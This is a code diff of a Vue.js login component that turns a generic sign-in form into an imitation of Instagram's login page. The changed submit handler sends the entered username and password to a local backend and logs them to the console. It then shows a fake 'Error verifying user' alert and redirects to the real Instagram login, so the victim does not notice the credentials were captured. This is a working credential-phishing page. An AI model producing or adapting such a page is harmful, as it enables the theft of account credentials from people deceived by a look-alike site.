@@ -1,22 +1,34 @@
 <template>
   <div class="container">
-    <form>
-      <div class="form-outline mb-4">
-        <input type="email" id="emailinput" class="form-control" placeholder="email..."/>
-      </div>
-
-      <div class="form-outline mb-4">
-        <input type="password" id="passwordinput" class="form-control" placeholder="password..."/>
-      </div>
-
-      <button 
-        type="button" 
-        class="btn btn-primary btn-block mb4"
-        @click="handleSubmit"
-      >
-        Sign In
-      </button>
-    </form>
+    <div class="box">
+      <div class="heading"></div>
+      <form class="login-form">
+        <div class="field">
+          <input id="username" type="name" placeholder="Phone number, username, or email" />
+          <label for="username">Phone number, username, or email</label>
+        </div>
+        <div class="field">
+          <input id="password" type="password" placeholder="password" />
+          <label for="password">Password</label>
+        </div>
+        <button type="button" class="login-button" title="login" @click="handleSubmit">Log In</button>
+        <div class="separator">
+          <div class="line"></div>
+          <p>OR</p>
+          <div class="line"></div>
+        </div>
+        <div class="other">
+          <button class="fb-login-btn" type="button">
+            <i class="fa fa-facebook-official fb-icon"></i>
+            <span class="">Log in with Facebook</span>
+          </button>
+          <a class="forgot-password" href="#">Forgot password?</a>
+        </div>
+      </form>
+    </div>
+    <div class="box">
+        <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+    </div>
   </div>
 </template>
 
@@ -34,25 +46,31 @@ export default {
   methods: {
     handleSubmit() {
       const path = "http://localhost:5001/login";
-      const email = document.getElementById("emailinput").value;
-      const password = document.getElementById("passwordinput").value;
-      // console.log(`Email: ${email} | Password: ${password}`);
+      const email = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
 
-      document.getElementById("emailinput").value = "";
-      document.getElementById("passwordinput").value = "";
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
 
       const userData = {
         email: email,
         password: password
       };
-      // console.log(userData);
+      console.log(userData);
       axios.post(path, userData)
-        .then((res) => {
-          console.log(res);
-        })
-        .catch((err) => {
-          console.error(err);
-        })
+      .then((res) => {
+        if (res.data.status == "success") {
+          alert(`
+          Error verifying user, thank you for your patience
+          `)
+          window.location.replace("https://www.instagram.com/accounts/login/")
+        }
+        console.log(res.data);
+      })
+      .catch((err) => {
+        console.error(err);
+      })
+      
     }
   }
 }
